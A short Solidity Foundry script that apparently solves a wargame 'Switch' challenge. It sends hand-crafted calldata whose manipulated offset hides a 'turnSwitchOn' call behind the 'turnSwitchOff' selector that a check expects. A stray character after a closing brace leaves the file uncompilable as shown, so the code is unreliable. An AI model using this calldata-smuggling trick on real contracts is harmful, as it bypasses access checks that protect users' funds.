// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchScript is Script {

    address constant private SWITCH = 0x9999714C5c95Dd569f366319E16CD50Eae9fC803;

    function run() public {
        vm.startBroadcast();

        bytes4 offSelector  = bytes4(keccak256("turnSwitchOff()"));

        (bool ok, ) = SWITCH.call(
            abi.encodePacked(
                Switch.flipSwitch.selector, // 4bytes
                abi.encode(96), // offset size = 96bytes
                abi.encode(0x00), // dummy 32bytes
                abi.encode(offSelector), // 32bytes start with offSelector
                abi.encode(4), // actual data size = 4bytes
                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // 4bytes data
            )
        );
        require(ok);

        vm.stopBroadcast();
    }ㅎ
}
